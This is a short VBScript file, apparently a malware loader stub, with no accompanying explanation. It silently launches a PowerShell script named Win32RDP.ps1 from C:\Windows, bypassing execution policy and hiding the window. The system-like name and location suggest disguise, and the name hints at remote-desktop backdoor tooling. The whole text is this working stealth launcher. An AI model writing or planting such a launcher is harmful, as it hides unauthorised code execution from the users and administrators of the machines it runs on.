Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "powershell.exe -ep bypass C:\Windows\Win32RDP.ps1"
oShell.Run strArgs, 0, false